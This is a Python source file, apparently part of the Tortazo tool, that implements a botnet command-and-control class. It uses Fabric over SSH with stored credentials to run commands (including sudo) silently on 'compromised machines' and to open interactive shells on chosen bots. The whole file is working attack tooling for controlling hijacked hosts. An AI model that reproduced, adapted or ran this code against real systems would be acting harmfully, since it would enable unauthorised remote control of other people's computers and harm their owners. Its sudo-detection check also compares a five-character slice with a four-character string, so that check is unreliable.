# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

CommandAndControl.py

CommandAndControl is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

CommandAndControl is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

import sys

from fabric.api import env, run, execute, hide, sudo, open_shell
from stem.util import term


class CommandAndControl():
    '''
	CommandAndControl class used to execute commands over the compromised machines.
	'''
    def __init__(self, cli, tortazoBots):
        self.filterBots = []
        self.excludedBots = []
        self.cli = cli
        if self.cli.zombieMode.lower() != "all":
            self.cli.logger.info(term.format("[+] Entering Zombie Mode... ", term.Color.YELLOW))
            botsExcluded = cli.zombieMode.split(",")
            for bot in tortazoBots:
                if bot.nickname.rstrip("\n") in botsExcluded:
                    self.cli.logger.info(term.format("[+] Excluding Nickname: "+bot.nickname.rstrip("\n"), term.Color.YELLOW))
                    self.excludedBots.append(bot)
                else:
                    self.filterBots.append(bot)
        else:
            self.cli.logger.info(term.format("[+] Entering Zombie Mode... Including all bots ", term.Color.YELLOW))
            self.filterBots = tortazoBots

        for bot in self.filterBots:
            host = bot.user+"@"+bot.host+":"+bot.port
            bot.host = host
            env.hosts.append(bot.host)
            env.passwords[bot.host] = bot.password
            self.cli.logger.debug(term.format("[+] Adding Bot: "+bot.host, term.Color.GREEN))


    def runOnBotnet(self, command):
        try:
            with hide('running', 'stdout', 'stderr'):
                if command.strip()[0:5] == "sudo":
                    results = sudo(command)
                else:
                    results = run(command)
        except:
            results = "Unexpected error:", sys.exc_info()[0]		
            self.cli.logger.error(term.format("[-] Exception executing command:  "+command, term.Color.RED))
            self.cli.logger.error(term.format("[-] Trace of the exception: "+str(results), term.Color.RED))
        return results


    def executeCommand(self, command):
        self.cli.logger.debug(term.format("[+] Executing command on botnet: "+command, term.Color.GREEN))
        for host, result in execute(self.runOnBotnet, command, hosts=env.hosts).iteritems():
            for bot in self.filterBots:
                if bot.host == host:
                    bot.results[command] = result

    def openShell(self, hostId):
        for bot in self.filterBots:
            if int(hostId) == bot.hostId:
                self.cli.logger.debug(term.format("[+] Opening Shell: "+str(bot.hostId), term.Color.GREEN))
                '''
                hostId-1 because is an array (starting from 0 index)
                '''
                execute(open_shell, host=env.hosts[bot.hostId-1])
